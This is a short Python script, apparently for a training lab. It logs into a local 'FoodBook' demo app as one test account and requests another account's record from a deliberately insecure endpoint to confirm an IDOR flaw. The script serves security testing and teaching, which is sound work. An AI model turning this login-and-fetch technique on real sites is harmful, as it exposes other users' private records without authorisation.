"""Checks the local FoodBook IDOR demonstration using two test accounts."""
import argparse
import sys
import requests
from bs4 import BeautifulSoup


def main():
    parser = argparse.ArgumentParser(description="Local FoodBook IDOR check")
    parser.add_argument("--base-url", default="http://127.0.0.1:8000")
    parser.add_argument("--username", required=True, help="login of account A")
    parser.add_argument("--password", required=True)
    parser.add_argument("--entry-id", required=True, type=int, help="ID of account B's test record")
    args = parser.parse_args()
    base = args.base_url.rstrip("/")
    session = requests.Session()
    login_page = session.get(base + "/login/", timeout=5)
    login_page.raise_for_status()
    soup = BeautifulSoup(login_page.text, "html.parser")
    token = soup.find("input", {"name": "csrfmiddlewaretoken"})
    if token is None:
        print("Не удалось получить CSRF-токен со страницы входа.")
        return 2
    response = session.post(base + "/login/", data={
        "username": args.username,
        "password": args.password,
        "csrfmiddlewaretoken": token.get("value", ""),
        "next": "/",
    }, headers={"Referer": base + "/login/"}, timeout=5, allow_redirects=True)
    response.raise_for_status()
    if 'name="username"' in response.text and "/login/" in response.url:
        print("Вход не выполнен: проверьте логин и пароль.")
        return 2
    result = session.get(f"{base}/lab/idor/insecure/{args.entry_id}/", timeout=5)
    print("HTTP:", result.status_code)
    if result.status_code == 200:
        print("Запись доступна текущему пользователю. Если она принадлежит другому аккаунту, это подтверждает IDOR.")
        soup = BeautifulSoup(result.text, "html.parser")
        print("Заголовок страницы:", soup.title.get_text(" ", strip=True) if soup.title else "не найден")
        return 0
    print("Доступ не получен. Проверьте ID записи, авторизацию и запуск локального сервера.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
